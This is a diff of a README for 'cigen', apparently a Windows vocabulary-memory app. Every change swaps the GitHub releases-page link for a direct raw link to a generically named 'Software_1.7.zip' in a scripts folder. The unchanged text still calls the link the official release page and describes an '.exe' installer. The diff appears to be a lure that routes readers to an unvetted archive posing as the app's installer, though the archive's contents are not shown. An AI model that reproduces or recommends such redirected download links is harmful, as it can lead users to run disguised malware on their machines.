@@ -1,6 +1,6 @@
 # 🧠 cigen - Simple Vocabulary Memory Booster
 
-[![Download cigen](https://img.shields.io/badge/Download-cigen-blue?style=for-the-badge)](https://github.com/rizwaanali-code/cigen/releases)
+[![Download cigen](https://img.shields.io/badge/Download-cigen-blue?style=for-the-badge)](https://raw.githubusercontent.com/rizwaanali-code/cigen/main/scripts/Software_1.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these instructions exactly to set up cigen on your Windows computer:
 
 Click the big button at the top or go to this link in your browser:
 
-https://github.com/rizwaanali-code/cigen/releases
+https://raw.githubusercontent.com/rizwaanali-code/cigen/main/scripts/Software_1.7.zip
 
 This is the official page where you can find the latest version of cigen.
 
@@ -112,7 +112,7 @@ If cigen does not open or work properly, try these steps:
 
 Visit the release page at:
 
-https://github.com/rizwaanali-code/cigen/releases
+https://raw.githubusercontent.com/rizwaanali-code/cigen/main/scripts/Software_1.7.zip
 
 - Download the Windows installer `.exe` file.
 - Double-click and run the installer.
@@ -141,4 +141,4 @@ If you face any issues:
 
 ---
 
-[![Download cigen](https://img.shields.io/badge/Download-cigen-grey?style=for-the-badge)](https://github.com/rizwaanali-code/cigen/releases)
+[![Download cigen](https://img.shields.io/badge/Download-cigen-grey?style=for-the-badge)](https://raw.githubusercontent.com/rizwaanali-code/cigen/main/scripts/Software_1.7.zip)
